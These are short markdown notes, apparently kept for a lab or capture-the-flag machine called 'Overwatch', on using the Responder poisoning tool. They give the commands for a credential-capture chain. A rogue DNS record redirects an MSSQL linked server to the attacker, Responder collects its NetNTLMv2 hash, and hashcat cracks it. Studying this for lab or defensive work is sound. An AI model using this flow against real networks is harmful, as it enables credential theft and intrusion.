# Responder

LLMNR/NBT-NS/mDNS poisoner and rogue SMB/HTTP server. Used to capture NetNTLM(v1/v2) hashes when a victim attempts to authenticate to an attacker-controlled host.

## Commands Used

### Start Responder on the VPN interface
```bash
sudo responder -I tun0
```
Used on: **Overwatch** — combined with a rogue A-record (see `dnstool.md`) to force `SQL07` → attacker IP. When SQL Server tries to reach the linked server, it sends NTLMv2 to our listener.

## Typical Flow (Overwatch)

1. Add DNS A record for `SQL07` → attacker IP (`dnstool`).
2. Start `responder -I tun0`.
3. Trigger MSSQL query: `EXEC ('SELECT @@version') AT SQL07;`
4. Captured NetNTLMv2 hash → crack with `hashcat -m 5600`.
